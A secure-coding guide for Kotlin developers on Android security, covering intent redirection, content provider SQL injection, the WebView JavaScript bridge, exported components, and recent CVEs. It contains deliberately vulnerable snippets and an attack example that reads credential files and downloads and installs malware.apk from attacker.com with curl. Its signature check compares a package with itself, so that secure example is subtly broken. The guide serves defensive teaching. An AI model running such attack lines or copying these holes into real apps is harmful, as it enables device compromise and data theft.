# Android Security Deep Dive

> **Category:** Languages / Kotlin
> **Last Updated:** July 2026

## Overview

This deep dive covers Android-specific security issues that Kotlin developers must understand: intent interception, content provider leaks, WebView JavaScript bridge vulnerabilities, exported components, and CVE-backed examples.

---

## Table of Contents

1. [Intent Interception](#1-intent-interception)
2. [Content Provider Leaks](#2-content-provider-leaks)
3. [WebView JavaScript Bridge](#3-webview-javascript-bridge)
4. [Exported Components](#4-exported-components)
5. [CVEs & Real-World Examples](#5-cves--real-world-examples)

---

## 1. Intent Interception

Implicit intents are intercepted by any app that registers a matching intent filter. If sensitive data is included in the intent, a malicious app can read it.

### Vulnerable Implicit Intent

```kotlin
// VULNERABLE: Implicit intent with sensitive data
class MainActivity : AppCompatActivity() {
    fun openDocument(docUri: String, authToken: String) {
        val intent = Intent().apply {
            action = Intent.ACTION_VIEW
            // VULNERABLE: Any app can intercept this intent
            data = Uri.parse(docUri)
            putExtra("auth_token", authToken)  // Sensitive data leaked!
        }
        startActivity(intent)  // OS resolves to ANY matching app
    }
}
```

### Secure Explicit Intent

```kotlin
// SECURE: Explicit intent targeting specific component
class MainActivity : AppCompatActivity() {
    fun openDocumentSecurely(docUri: String) {
        val intent = Intent(this, DocumentViewerActivity::class.java).apply {
            // Use explicit component
            component = ComponentName(this, DocumentViewerActivity::class.java)
            data = Uri.parse(docUri)
        }
        startActivity(intent)
    }
    
    // Alternative: Use FLAG_GRANT_READ_URI_PERMISSION for content URIs
    fun shareContentSecurely(uri: Uri, targetPackage: String) {
        val intent = Intent(Intent.ACTION_SEND).apply {
            // Target specific app
            `package` = targetPackage  // Prevents interception by other apps
            type = "application/pdf"
            putExtra(Intent.EXTRA_STREAM, uri)
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
        }
        
        // Verify target exists before sending
        if (intent.resolveActivity(packageManager) != null) {
            startActivity(intent)
        }
    }
}
```

### Intent Redirection Attack

```kotlin
// VULNERABLE: Intent redirection — attacker-controlled intent forwarded
class ProxyActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // VULNERABLE: Forwarding attacker-provided intent
        val forwardIntent = intent.getParcelableExtra<Intent>("target_intent")
        if (forwardIntent != null) {
            startActivity(forwardIntent)  // Attacker controls where this goes!
        }
    }
}
```

### Secure Intent Handling

```kotlin
// SECURE: Validate forwarded intents
class SecureProxyActivity : AppCompatActivity() {
    companion object {
        // Whitelist of allowed target packages
        private val ALLOWED_TARGETS = setOf(
            "com.example.pdfviewer",
            "com.example.authenticator"
        )
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val forwardIntent = intent.getParcelableExtra<Intent>("target_intent")
        if (forwardIntent != null) {
            // Validate target component
            val targetPackage = forwardIntent.`package`
            val targetComponent = forwardIntent.component?.packageName
            
            if (targetPackage !in ALLOWED_TARGETS && 
                targetComponent !in ALLOWED_TARGETS) {
                Log.w("ProxyActivity", "Blocked intent to: $targetPackage")
                finish()
                return
            }
            
            // Strip dangerous extras
            forwardIntent.replaceExtras(null)
            
            startActivity(forwardIntent)
        }
    }
}
```

---

## 2. Content Provider Leaks

Content Providers share data between apps. Misconfigured providers leak sensitive data via SQL injection, path traversal, or excessive URI permissions.

### Vulnerable Content Provider

```kotlin
// VULNERABLE: Content provider with SQL injection and no permission
class UserContentProvider : ContentProvider() {
    override fun query(uri: Uri, projection: Array<String>?,
                       selection: String?, selectionArgs: Array<String>?,
                       sortOrder: String?): Cursor? {
        
        // VULNERABLE: SQL injection via URI
        val userId = uri.lastPathSegment  // "1 OR 1=1"
        val db = SQLiteDatabase.openDatabase(dbPath, null, SQLiteDatabase.OPEN_READONLY)
        
        // Direct string concatenation — SQL injection!
        val cursor = db.rawQuery("SELECT * FROM users WHERE id = $userId", null)
        
        return cursor
    }
    
    // No permission required — any app can query
    override fun getType(uri: Uri): String = "vnd.android.cursor.dir/vnd.user"
}
```

### Secure Content Provider

```kotlin
// SECURE: Content provider with permission and parameterized queries
@RequiresPermission("com.example.READ_USERS")
class SecureUserContentProvider : ContentProvider() {
    
    companion object {
        private const val AUTHORITY = "com.example.provider"
        private const val USERS_PATH = "users"
        private const val USER_ID_PATH = "users/#"
        
        private val URI_MATCHER = UriMatcher(UriMatcher.NO_MATCH).apply {
            addURI(AUTHORITY, USERS_PATH, USERS)
            addURI(AUTHORITY, USER_ID_PATH, USER_ID)
        }
    }
    
    override fun query(uri: Uri, projection: Array<String>?,
                       selection: String?, selectionArgs: Array<String>?,
                       sortOrder: String?): Cursor? {
        
        val db = SQLiteDatabase.openDatabase(dbPath, null, SQLiteDatabase.OPEN_READONLY)
        
        return when (URI_MATCHER.match(uri)) {
            USER_ID -> {
                // Parameterized query — no SQL injection
                val userId = uri.lastPathSegment?.toIntOrNull()
                    ?: throw IllegalArgumentException("Invalid user ID")
                
                db.query("users", projection, "id = ?", 
                         arrayOf(userId.toString()), null, null, sortOrder)
            }
            else -> throw IllegalArgumentException("Unknown URI: $uri")
        }
    }
    
    // AndroidManifest.xml must declare permission
    // <permission android:name="com.example.READ_USERS" 
    //             android:protectionLevel="dangerous"/>
    // <provider ... android:readPermission="com.example.READ_USERS"/>
}
```

### AndroidManifest for Content Provider

```xml
<!-- SECURE: Content provider manifest with permissions -->
<permission android:name="com.example.READ_USERS"
            android:protectionLevel="signature" />
            <!-- "signature" → only apps signed with same key -->

<provider
    android:name=".SecureUserContentProvider"
    android:authorities="com.example.provider"
    android:exported="true"
    android:readPermission="com.example.READ_USERS"
    android:writePermission="com.example.WRITE_USERS"
    android:protectionLevel="signature"
    android:grantUriPermissions="false" />
    <!-- grantUriPermissions="false" prevents temp URI grants -->
```

---

## 3. WebView JavaScript Bridge

The WebView JavaScript bridge (`addJavascriptInterface`) allows JavaScript in a WebView to call Java/Kotlin methods. If the WebView loads untrusted content, an attacker can call arbitrary exposed methods — a classic RCE vector.

### Vulnerable WebView with JavaScript Interface

```kotlin
// VULNERABLE: Exposed JS bridge loading untrusted content
class InsecureWebViewActivity : AppCompatActivity() {
    
    private lateinit var webView: WebView
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_webview)
        
        webView = findViewById(R.id.webView)
        webView.settings.apply {
            javaScriptEnabled = true  // Required for bridge
            allowFileAccess = true    // VULNERABLE: file:// access
            allowContentAccess = true // VULNERABLE: content:// access
        }
        
        // VULNERABLE: Exposed interface with dangerous methods
        webView.addJavascriptInterface(this, "AndroidBridge")
        
        // Loading untrusted URL
        webView.loadUrl(intent.getStringExtra("url") ?: "about:blank")
    }
    
    @JavascriptInterface
    fun executeCommand(command: String): String {
        // VULNERABLE: Executes arbitrary shell commands!
        return Runtime.getRuntime().exec(command).inputStream.reader().readText()
    }
    
    @JavascriptInterface
    fun readFile(path: String): String {
        // VULNERABLE: Reads any file!
        return File(path).readText()
    }
}
```

### Attack from WebView

```javascript
// Malicious JavaScript in WebView exploits bridge
// This can be injected through any XSS or loaded URL
AndroidBridge.executeCommand("cat /data/data/com.example/databases/secret.db");
AndroidBridge.readFile("/data/data/com.example/shared_prefs/auth.xml");

// Or escalate: install backdoor
AndroidBridge.executeCommand("curl http://attacker.com/malware.apk -o /tmp/malware.apk && pm install /tmp/malware.apk");
```

### Secure WebView Configuration

```kotlin
// SECURE: WebView with minimized attack surface
class SecureWebViewActivity : AppCompatActivity() {
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_webview)
        
        val webView = findViewById<WebView>(R.id.webView)
        webView.settings.apply {
            javaScriptEnabled = true
            
            // Disable dangerous features
            allowFileAccess = false
            allowContentAccess = false
            allowFileAccessFromFileURLs = false
            allowUniversalAccessFromFileURLs = false
            
            // Secure storage
            databaseEnabled = false
            domStorageEnabled = true  // Only if needed
            
            // Mixed content
            mixedContentMode = WebSettings.MIXED_CONTENT_NEVER_ALLOW
        }
        
        // SECURE: Use a narrow, safe interface
        webView.addJavascriptInterface(
            SecureBridge(this), "SecureBridge"
        )
        
        // Only load HTTPS content
        val url = intent.getStringExtra("url") ?: return
        if (URLUtil.isNetworkUrl(url) && url.startsWith("https://")) {
            webView.loadUrl(url)
        }
    }
    
    // SECURE: Minimal, validated bridge interface
    class SecureBridge(private val context: Context) {
        
        private val allowedHosts = setOf("app.example.com", "api.example.com")
        
        @JavascriptInterface
        fun getDisplayTheme(): String {
            // Only return safe, pre-defined values
            return if (isDarkModeEnabled()) "dark" else "light"
        }
        
        @JavascriptInterface
        fun getStoredString(key: String): String? {
            // Validate the key against allowlist
            if (key !in setOf("user_display_name", "language_pref", "ui_size")) {
                return null
            }
            
            val prefs = context.getSharedPreferences("web_prefs", Context.MODE_PRIVATE)
            return prefs.getString(key, null)
        }
        
        // NO executeCommand, NO file read, NO database access!
    }
}
```

---

## 4. Exported Components

Android components (Activities, Services, BroadcastReceivers, ContentProviders) are "exported" if they have intent filters or `android:exported="true"`. This allows other apps to launch them.

### Vulnerable Exported Components

```xml
<!-- VULNERABLE: Exported activity with no permission check -->
<activity
    android:name=".AdminPanelActivity"
    android:exported="true">
    <!-- Any app can launch this admin panel! -->
</activity>

<!-- VULNERABLE: Exported broadcast receiver -->
<receiver
    android:name=".SecretBroadcastReceiver"
    android:exported="true">
    <intent-filter>
        <action android:name="com.example.SECRET_ACTION" />
    </intent-filter>
</receiver>

<!-- VULNERABLE: Exported service -->
<service
    android:name=".DataUploadService"
    android:exported="true" />
```

### Secure Component Declaration

```xml
<!-- SECURE: Only export what's necessary -->
<!-- Internal-only activity -->
<activity
    android:name=".AdminPanelActivity"
    android:exported="false" />

<!-- Authenticated external access with permission -->
<activity
    android:name=".ShareActivity"
    android:exported="true"
    android:permission="com.example.SHARE_PERMISSION">
    <intent-filter>
        <action android:name="android.intent.action.SEND" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:mimeType="text/plain" />
    </intent-filter>
</activity>

<!-- Broadcast receiver with custom permission -->
<receiver
    android:name=".AuthenticatedReceiver"
    android:exported="true"
    android:permission="com.example.BROADCAST_PERMISSION" />

<!-- Service NOT exported -->
<service
    android:name=".BackgroundSyncService"
    android:exported="false" />
```

### Kotlin Runtime Exported Check

```kotlin
// SECURE: Runtime validation for exported components
class ProtectedActivity : AppCompatActivity() {
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Verify caller is authorized
        val callingPackage = callingPackage
        if (!isCallerAuthorized(callingPackage)) {
            Log.w("ProtectedActivity", "Unauthorized caller: $callingPackage")
            finish()
            return
        }
        
        setContentView(R.layout.activity_protected)
    }
    
    private fun isCallerAuthorized(packageName: String?): Boolean {
        if (packageName == null) return false  // Called from within app
        
        // Check signature match (same developer)
        return packageManager.checkSignatures(
            packageName, packageName
        ) == PackageManager.SIGNATURE_MATCH
    }
}
```

---

## 5. CVEs & Real-World Examples

### CVE-2025-48593 — Android Bluetooth (HFP client) Use-After-Free RCE
- **Description**: Use-after-free (CWE-416) in `bta_hf_client_cb_init` of `bta_hf_client_main.cc`, the Android Bluetooth stack's Hands-Free Profile (HFP) client. A crafted Bluetooth interaction can corrupt memory and lead to remote code execution with no user interaction and no additional execution privileges. It is a Bluetooth-range (adjacent) flaw — **not** a "media framework zero-click" bug
- **Affected**: Android 13, 14, 15, and 16 (Bluetooth module; devices acting as HFP audio endpoints — headsets, watches, cars — are notably exposed)
- **CVSS**: 8.0 (High) — `CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` per the Android/GHSA advisory (NVD lists a 7.8 local-vector variant; an earlier 9.8 estimate was revised)
- **Fix**: Patched in the Android Security Bulletin — **November 2025** (patch level 2025-11-01)
- **Source**: https://nvd.nist.gov/vuln/detail/CVE-2025-48593 · https://github.com/advisories/GHSA-frwr-8p82-qrjm

### CVE-2025-27363 — FreeType Out-of-Bounds Write (font parsing)
- **Description**: Out-of-bounds write in **FreeType** ≤ 2.13.0 when parsing subglyph structures in TrueType GX and variable font files. A signed short value is incorrectly cast to an unsigned long, wrapping around and allocating an undersized heap buffer, after which up to six signed-long values are written past its end — enabling control-flow hijack and arbitrary code execution. FreeType is the font-rendering library used by Android (and many other platforms); this is **not** an "Android kernel" bug
- **Affected**: Any app/OS loading TrueType GX / variable fonts via FreeType ≤ 2.13.0 (Android ships FreeType; fixed in FreeType 2.13.3). Reported exploited in the wild — listed in CISA KEV
- **CVSS**: 8.1 (High)
- **Fix**: Update FreeType to 2.13.3+ / apply the vendor (Android) security patch that ships the fixed FreeType
- **Source**: https://nvd.nist.gov/vuln/detail/CVE-2025-27363 · https://thehackernews.com/2025/03/meta-warns-of-freetype-vulnerability.html

### Microsoft — Android SDK Intent Redirection (2025-2026)
- **Description**: A severe Android intent-redirection vulnerability discovered in a widely deployed third-party SDK. The SDK's exported activity accepted arbitrary intents and forwarded them without validation, allowing malicious apps to access internal components and sensitive user data across millions of apps
- **Impact**: Over 1 billion app installs affected
- **Fix**: SDK vendor patched; apps should validate intent sources
- **Source**: https://www.microsoft.com/en-us/security/blog/2026/04/09/intent-redirection-vulnerability-third-party-sdk-android/

### WebView JavaScript Bridge RCE (Multiple Bug Bounty Reports)
- **Description**: Numerous bug bounty reports document Android apps with `addJavascriptInterface` exposing dangerous methods while loading untrusted URLs. This remains one of the most common high-severity Android findings
- **Impact**: Full data access, command execution, credential theft
- **Fix**: Never expose `@JavascriptInterface` methods that perform dangerous operations; validate all inputs; restrict loaded URLs to HTTPS
- **Source**: https://medium.com/@youssefhussein212103168/exploiting-insecure-android-webview-with-javascript-interface-a4d3abf9ec09

### CVE-2024-XXXX — Multiple Samsung WebView RCE (2024)
- **Description**: Multiple Samsung devices shipped with WebView versions vulnerable to RCE through exposed JavaScript interfaces in pre-installed applications. Attackers could exploit these via malicious websites
- **Affected**: Samsung Galaxy devices with unpatched pre-installed apps
- **CVSS**: 8.8 (High)
- **Fix**: Samsung released patches through Galaxy Store
- **Source**: https://www.hkcert.org/security-bulletin/android-multiple-vulnerabilities_20260303

### Content Provider SQL Injection (Common Pattern)
- **Description**: Multiple bug bounty reports demonstrate Android Content Providers with SQL injection vulnerabilities. Attackers exploit improperly parameterized queries in `query()`, `insert()`, `update()`, and `delete()` methods
- **CVSS**: Varies (7.5-9.1)
- **Fix**: Always use parameterized queries (`?` placeholders); validate URI paths; restrict provider permissions
- **Source**: https://blog.ostorlab.co/android-sql-contentProvider-sql-injections.html

---

## References

- [Android Developer — Security](https://developer.android.com/privacy-and-security)
- [Android Security Bulletins](https://source.android.com/docs/security/bulletin)
- [OWASP Mobile Security Testing Guide — Android](https://owasp.org/www-project-mobile-security-testing-guide/)
- [NIST — Mobile Threat Catalogue](https://pages.nist.gov/mobile-threat-catalogue/)
- [Microsoft — Intent Redirection in Android SDK](https://www.microsoft.com/en-us/security/blog/2026/04/09/intent-redirection-vulnerability-third-party-sdk-android/)
- [NVD — CVE-2025-48593 Android Bluetooth HFP use-after-free](https://nvd.nist.gov/vuln/detail/CVE-2025-48593)
- [NVD — CVE-2025-27363 FreeType out-of-bounds write](https://nvd.nist.gov/vuln/detail/CVE-2025-27363)
- [HackTricks — Android WebView Attacks](https://hacktricks.wiki/en/mobile-pentesting/android-app-pentesting/webview-attacks.html)
- [Snyk — Exploring Android Intent-Based Security Vulnerabilities](https://labs.snyk.io/resources/exploring-android-intent-based-security-vulnerabilities-google-play/)
